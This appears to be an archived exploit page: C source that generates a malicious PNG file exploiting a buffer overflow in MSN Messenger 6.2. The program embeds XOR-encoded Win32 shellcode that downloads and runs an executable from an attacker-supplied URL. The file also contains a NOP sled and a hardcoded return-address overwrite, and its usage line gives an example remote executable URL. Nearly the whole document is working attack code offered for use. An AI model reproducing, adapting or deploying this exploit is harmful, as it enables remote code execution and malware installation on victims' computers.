<html>
<head>
<title>MSN Messenger PNG Image Buffer Overflow (linux compile)</title>
<pre>
/*
*
* Remember g++ k /str0ke
*
*/

/*
*
* MSN Messenger PNG Image Buffer Overflow Download Shellcoded Exploit
* Bug discoveried by Core Security Technologies  (www.coresecurity.com)
* Exploit coded By ATmaCA
* Copyright ©2002-2005 AtmacaSoft Inc. All Rights Reserved.
* Web: http://www.atmacasoft.com
* E-Mail: atmaca@icqmail.com
* Credit to kozan and delikon
* Now compiles under Linux thanks to dgr
* Usage:exploit &lt;OutputPath&gt; &lt;Url&gt;
*
*/

/*
*
* Tested with MSN Messenger 6.2.0137
* This vulnerability can be exploited on Windows 2000 (all service packs)
* and Windows XP (all service packs) that run vulnerable
* clients of MSN Messenger.
*
*/

/*
*
* After creating vuln png image, open
* MSN Messenger and select it as your display picture in
* &quot;Tools-&gt;Change Display Picture&quot;.
*
*/

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;


#ifdef __BORLANDC__
         #include &lt;mem.h&gt;
         #include &lt;conio.h&gt;
#endif

#define NOP 0x90

char png_header[] =
&quot;\x89\x50\x4E\x47\x0D\x0A\x1A\x0A\x00\x00\x00\x0D\x49\x48\x44\x52&quot;
&quot;\x00\x00\x00\x40\x00\x00\x00\x40\x08\x03\x00\x00\x00\x9D\xB7\x81&quot;
&quot;\xEC\x00\x00\x01\xB9\x74\x52\x4E\x53&quot;;

char pngeof[] = &quot;\x90\x90\x90\x59\xE8\x47\xFE\xFF\xFF&quot;;

/* Generic win32 http download shellcode
   xored with 0x1d by delikon (http://delikon.de/) */
char shellcode[] = &quot;\xEB&quot;
&quot;\x10\x58\x31\xC9\x66\x81\xE9\x22\xFF\x80\x30\x1D\x40\xE2\xFA\xEB\x05\xE8\xEB\xFF&quot;
&quot;\xFF\xFF\xF4\xD1\x1D\x1D\x1D\x42\xF5\x4B\x1D\x1D\x1D\x94\xDE\x4D\x75\x93\x53\x13&quot;
&quot;\xF1\xF5\x7D\x1D\x1D\x1D\x2C\xD4\x7B\xA4\x72\x73\x4C\x75\x68\x6F\x71\x70\x49\xE2&quot;
&quot;\xCD\x4D\x75\x2B\x07\x32\x6D\xF5\x5B\x1D\x1D\x1D\x2C\xD4\x4C\x4C\x90\x2A\x4B\x90&quot;
&quot;\x6A\x15\x4B\x4C\xE2\xCD\x4E\x75\x85\xE3\x97\x13\xF5\x30\x1D\x1D\x1D\x4C\x4A\xE2&quot;
&quot;\xCD\x2C\xD4\x54\xFF\xE3\x4E\x75\x63\xC5\xFF\x6E\xF5\x04\x1D\x1D\x1D\xE2\xCD\x48&quot;
&quot;\x4B\x79\xBC\x2D\x1D\x1D\x1D\x96\x5D\x11\x96\x6D\x01\xB0\x96\x75\x15\x94\xF5\x43&quot;
&quot;\x40\xDE\x4E\x48\x4B\x4A\x96\x71\x39\x05\x96\x58\x21\x96\x49\x18\x65\x1C\xF7\x96&quot;
&quot;\x57\x05\x96\x47\x3D\x1C\xF6\xFE\x28\x54\x96\x29\x96\x1C\xF3\x2C\xE2\xE1\x2C\xDD&quot;
&quot;\xB1\x25\xFD\x69\x1A\xDC\xD2\x10\x1C\xDA\xF6\xEF\x26\x61\x39\x09\x68\xFC\x96\x47&quot;
&quot;\x39\x1C\xF6\x7B\x96\x11\x56\x96\x47\x01\x1C\xF6\x96\x19\x96\x1C\xF5\xF4\x1F\x1D&quot;
&quot;\x1D\x1D\x2C\xDD\x94\xF7\x42\x43\x40\x46\xDE\xF5\x32\xE2\xE2\xE2\x70\x75\x75\x33&quot;
&quot;\x78\x65\x78\x1D&quot;;

FILE           *di;
int            i = 0;
short int      weblength;
char           *web;
char           *pointer = NULL;
char           *newshellcode;

/*xor cryptor*/
char *Sifrele(char *Name1)
{
        char *Name=Name1;
        char xor=0x1d;
        int Size=strlen(Name);
        for(i=0;i&lt;Size;i++)
                Name[i]=Name[i]^xor;
        return Name;
}


int main(int argc, char *argv[])
{

        if (argc &lt; 3)
        {
                printf(&quot;MSN Messenger PNG Image Buffer Overflow Download Shellcoded Exploit\n&quot;);
                printf(&quot;Bug discoveried by Core Security Technologies  (www.coresecurity.com)\n&quot;);
                printf(&quot;Exploit coded By ATmaCA\n&quot;);
                printf(&quot;Copyright ©2002-2005 AtmacaSoft Inc. All Rights Reserved.\n&quot;);
                printf(&quot;Web: http://www.atmacasoft.com\n&quot;);
                printf(&quot;E-Mail: atmaca@icqmail.com\n&quot;);
                printf(&quot;Credit to kozan and delikon\n\n&quot;);
                printf(&quot;\tUsage:exploit &lt;OutputPath&gt; &lt;Url&gt;\n&quot;);
                printf(&quot;\tExample:exploit vuln.png http://www.atmacasoft.com/exp/msg.exe\n&quot;);

                return 0;
        }


	web = argv[2];


        if( (di=fopen(argv[1],&quot;wb&quot;)) == NULL )
        {
                printf(&quot;Error opening file!\n&quot;);
                return 0;
        }
        for(i=0;i&lt;sizeof(png_header)-1;i++)
                fputc(png_header[i],di);

        /*stuff in a couple of NOPs*/
        for(i=0;i&lt;99;i++)
                fputc(NOP,di);

        weblength=(short int)0xff22;
        pointer=strstr(shellcode,&quot;\x22\xff&quot;);
	weblength-=strlen(web)+1;
        memcpy(pointer,&amp;weblength,2);
        newshellcode = new char[sizeof(shellcode)+strlen(web)+1];
        strcpy(newshellcode,shellcode);
        strcat(newshellcode,Sifrele(web));
        strcat(newshellcode,&quot;\x1d&quot;);

        //shell code
        for(i=0;i&lt;strlen(newshellcode);i++)
                fputc(newshellcode[i],di);


        for(i=0;i&lt;(83-strlen(web));i++) //NOPs
                fputc(NOP,di);

	/*Overwriting the return address (EIP)*/
        /*0x005E0547 - ret */
        fputc(0x47,di);
        fputc(0x05,di);
        fputc(0x5e,di);
        fputc(0x00,di);

        for(i=0;i&lt;sizeof(pngeof)-1;i++)
                fputc(pngeof[i],di);

        printf(&quot;Vulnarable png file %s has been generated!\n&quot;,argv[1]);

        fclose(di);

	return 1;
}

// milw0rm.com [2005-02-09]
</pre>
</html>

